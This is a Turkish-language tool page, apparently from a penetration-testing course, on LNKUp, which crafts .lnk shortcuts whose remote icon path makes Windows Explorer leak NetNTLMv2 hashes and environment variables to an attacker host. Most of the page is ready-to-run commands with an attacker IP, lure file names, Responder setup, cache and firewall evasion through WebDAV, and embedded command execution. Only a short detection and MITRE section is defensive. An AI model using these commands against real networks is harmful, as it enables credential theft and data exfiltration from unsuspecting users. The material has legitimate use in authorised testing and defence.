# LNKUp

> **Kategori:** [4. Zehirleme, MitM ve Zorlamalı Kimlik](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Gezgini'nin (Explorer) simge yükleme davranışını istismar ederek, kurbanın dosyaya tıklamasına bile gerek kalmadan dizini görüntülediği anda arka planda saldırganın SMB sunucusuna NTLM kimlik doğrulama isteği gönderen veya ortam değişkenlerini dışarı sızdıran özel `.lnk` (Kısayol) yükleri üreten sömürü aracı.

---

## 1. Genel Bakış ve Amaç

Sosyal mühendislik ve iç ağ sızma testlerinde kurban kullanıcıların bir `.exe` dosyasını indirmesini ve çalıştırmasını sağlamak modern EDR sistemleri (SmartScreen, Defender) tarafından kolaylıkla engellenir. Ancak Windows işletim sisteminin dosya formatı mimarisinde yer alan meşru özellikler, kullanıcı hiçbir dosyaya tıklamasa bile kimlik bilgilerinin çalınmasına imkan tanır.

Windows Kısayol Dosyaları (`.lnk`), hedef programın masaüstünde veya klasörde hangi ikonla gösterileceğini belirten bir `IconLocation` özelliğine sahiptir. Eğer bu ikon yolu bir yerel dosya yerine uzak bir Evrensel Adlandırma Kuralı (UNC) yolu olarak tanımlanırsa (`\\saldirgan-ip\paylasim\ikon.ico`), Windows Gezgini (Explorer) klasörü ekranda listelediği anda ikonu render etmek amacıyla otomatik olarak uzak sunucuya **SMB bağlantısı başlatır ve kullanıcının NetNTLMv2 karmasını iletir**.

**`LNKUp`** (Plazmaz tarafından geliştirilen), bu mekanizmayı otomatikleştiren bir Python aracıdır. Araç:
1. **NetNTLM Hash Hırsızlığı:** Sadece klasör açıldığında otomatik olarak NTLM hash'ini saldırganın `Responder` veya `ntlmrelayx` dinleyicisine gönderir.
2. **Ortam Değişkeni Sızdırma (Exfiltration):** Kurban makinedeki `%USERNAME%`, `%USERDOMAIN%`, `%COMPUTERNAME%` ve `%PATH%` gibi sistem değişkenlerini SMB/WebDAV sorgularının alt dizinleri olarak saldırgana aktarır.
3. **Komut Çalıştırma (Opsiyonel):** Kullanıcı kısayola çift tıkladığında çalışacak PowerShell veya CMD komutlarını kısayola gömer.

### Mimari Akış Şeması

```
[ Saldırgan ]                                           [ Ağ Paylaşımı / Kurban Klasörü ]                 [ Kurban Kullanıcı ]
      │                                                                  │                                          │
      ├─── (1) LNKUp ile Zararlı .lnk Üretimi ──────────────────────────►│                                          │
      │    IconPath = \\10.0.0.5\share\test.ico                          │                                          │
      │                                                                  │◄── (2) Windows Gezgini ile Klasörü Açar ─┤
      │                                                                  │    (Çift tıklama YOK, sadece bakar!)     │
      │                                                                  │                                          │
      │◄── (3) Otomatik SMB Bağlantısı ve NetNTLMv2 Hash İletimi ────────┴──────────────────────────────────────────┘
      │    (SMB SYN -> NTLMSSP Negotiate -> NTLM Response)
      ▼
[ Responder / Hashcat ] ──► Parola Kırma (Cracking) veya NTLM Relay!
```

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
python3 lnkup.py --host <SALDIRGAN_IP> --type <ntlm|environment> --output <CIKTI.lnk> [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `--host` | NTLM bağlantısının yönlendirileceği saldırgan IP adresi veya FQDN | `--host 10.0.0.5` |
| `--type` | Yük tipi: `ntlm` (Hash çalma) veya `environment` (Ortam değişkeni sızdırma) | `--type ntlm` |
| `--output` | Oluşturulacak `.lnk` dosyasının adı ve konumu | `--output fatura_detay.lnk` |
| `--vars` | Sızdırılacak ortam değişkenleri (`--type environment` ile kullanılır) | `--vars USERNAME PATH` |
| `--execute` | Kısayola çift tıklandığında çalıştırılacak opsiyonel komut | `--execute "powershell -c whoami"` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Sıfır-Tıklama (Zero-Click) NetNTLMv2 Hasat Kısayolu Üretme

Ağ paylaşımlarına (`\\fileserver\ortak`) bırakılacak ve klasörü açan her kullanıcının hash'ini toplayacak kısayol oluşturma:

```bash
# 1. LNKUp ile kurbanın hash'ini 10.0.0.5'e gönderecek kısayolu oluşturma
python3 lnkup.py --host 10.0.0.5 --type ntlm --output "Yillik_Prim_Listesi.lnk"

# 2. Kali üzerinde Responder dinleyicisini başlatma
sudo responder -I eth0 -dwv

# 3. Kısayol ortak dosya paylaşımına yüklenir; kullanıcı klasöre girdiği an hash yakalanır
```

### Senaryo 2: Kurban Ortam Değişkenlerini Sızdıran Kısayol Üretme

```bash
# Kullanıcı adı ve işletim sistemi mimarisini SMB yolu üzerinden dışarı çıkarma
python3 lnkup.py --host 10.0.0.5 --type environment --vars USERNAME PROCESSOR_ARCHITECTURE --output "Rapor.lnk"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Kök Neden | Çözüm Adımı |
|---|---|---|
| `Hash gelmiyor / Simge yüklenmedi` | Windows Gezgini simge önbelleğini (IconCache.db) kullanıyordur. | Dosya adını veya UNC yolundaki paylaşım adını değiştirerek önbellek okumasını atlatın. |
| `Giden SMB (Port 445) engellendi` | Şirket içi güvenlik duvarı uç noktalar arası SMB trafiğini engelliyordur. | `--host` olarak WebDAV (Port 80) formatında UNC yolu kullanın (`\\10.0.0.5@80\share`). |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler
* **Sysmon Event ID 11 (FileCreate):** Ağ paylaşımlarında veya yerel diskte `.lnk` dosyasının oluşturulması.
* **Security Event ID 5145:** Ağ paylaşımındaki `.lnk` dosyasına erişim denetimi.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım |
|---|---|---|
| **[T1187](https://attack.mitre.org/techniques/T1187/)** | Forced Authentication | LNK simgesi ile zorlamalı SMB kimlik doğrulama. |
| **[T1204.002](https://attack.mitre.org/techniques/T1204/002/)** | User Execution: Malicious File | Kullanıcının klasörü görüntülemesiyle tetiklenme. |

---

## 6. En Çok Kullanılan Komutlar (Cheat Sheet)

```bash
# 1. Basit NTLM hash yakalama LNK dosyası üretme
python3 lnkup.py --host 10.0.0.5 --type ntlm --output dosya.lnk

# 2. Ortam değişkenlerini (USERNAME, PATH) sızdıran LNK üretme
python3 lnkup.py --host 10.0.0.5 --type environment --vars USERNAME PATH --output sistem_bilgi.lnk

# 3. Çift tıklama ile gizli komut çalıştıran ve aynı anda hash çalan LNK
python3 lnkup.py --host 10.0.0.5 --type ntlm --output guncelleme.lnk --execute "calc.exe"

# 4. WebDAV üzerinden giden bağlantı tetikleme (Firewall Evasion)
python3 lnkup.py --host 10.0.0.5@80 --type ntlm --output webdav_leak.lnk
```

---

## Kaynaklar
- [GitHub — LNKUp (Plazmaz)](https://github.com/Plazmaz/LNKUp)

---

> **Önceki:** [← Farmer](./Farmer.md) · **Sonraki:** [Responder →](./Responder.md)
